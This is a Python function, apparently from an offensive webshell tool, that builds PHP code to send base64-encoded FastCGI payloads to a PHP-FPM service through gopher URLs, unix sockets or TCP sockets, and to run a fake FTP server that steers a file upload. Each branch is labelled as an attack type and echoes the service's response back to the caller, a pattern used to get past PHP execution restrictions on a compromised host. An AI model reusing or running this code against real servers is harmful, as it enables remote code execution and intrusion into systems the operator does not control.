
def get_php_fpm_eval(attack_type):
    php_code = ""
    if attack_type == "gopher":
        php_code = """
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "%s");
            curl_setopt($ch, CURLOPT_HEADER, 0);
            $o = curl_exec($ch);
            curl_close($ch);
            $o = end(explode('\\n\\n', str_replace('\\r', '', $o), 2));
            echo trim($o);
        """
    if attack_type == "sock":
        php_code = """
            $sock_path='%s';
            if(function_exists('stream_socket_client') && file_exists($sock_path)){
            $sock=stream_socket_client("unix://".$sock_path);
            } else {
            die('stream_socket_client function not exist or sock not exist');
            }
            fwrite($sock, base64_decode('%s'));
            $o = '';
            while (!feof($sock)) {
              $o .= fread($sock, 8192);
            }
            $o = end(explode('\\n\\n', str_replace('\\r', '', $o), 2));
            echo trim($o);
        """
    if attack_type == "http_sock":
        php_code = """
            $host='%s';
            $port=%s;
            if(function_exists('fsockopen')){
            $sock=fsockopen($host, $port, $errno, $errstr, 1);
            } else if(function_exists('pfsockopen')){
            $sock=pfsockopen($host, $port, $errno, $errstr, 1);
            } else if(function_exists('stream_socket_client')) {
            $sock=stream_socket_client("tcp://$sock_path:$port",$errno, $errstr, 1);
            } else {
            die('fsockopen/pfsockopen/stream_socket_client function not exist');
            }
            fwrite($sock, base64_decode('%s'));
            $o = '';
            while (!feof($sock)) {
              $o .= fread($sock, 8192);
            }
            $o = end(explode('\\n\\n', str_replace('\\r', '', $o), 2));
            echo trim($o);
        """
    if attack_type == "ftp":
        php_code = """
        if(function_exists('stream_socket_server') && function_exists('stream_socket_accept')){
            $ftp_table = [
                "USER" => "331 Username ok, send password.\\r\\n",
                "PASS" => "230 Login successful.\\r\\n",
                "TYPE" => "200 Type set to: Binary.\\r\\n",
                "SIZE" => "550 /test is not retrievable.\\r\\n",
                "EPSV" => "500 'EPSV': command not understood.\\r\\n",
                "PASV" => "227 Entering passive mode (%s,0,%s).\\r\\n",
                "STOR" => "150 File status okay. About to open data connection.\\r\\n",
            ];
            $server = stream_socket_server("tcp://0.0.0.0:%s", $errno, $errstr);
            $accept = stream_socket_accept($server);
            fwrite($accept, "200 OK\\r\\n");
            while (true) {
                $data = fgets($accept);
                $cmd = substr($data, 0, 4);
                if (array_key_exists($cmd, $ftp_table)) {
                    fwrite($accept, $ftp_table[$cmd]);
                    if ($cmd === "STOR") {
                        break;
                    }
                } else {
                    break;
                }
            }
            fclose($server);
            } else {
            die('stream_socket_server/stream_socket_accept function not exist');
        }"""

    return php_code
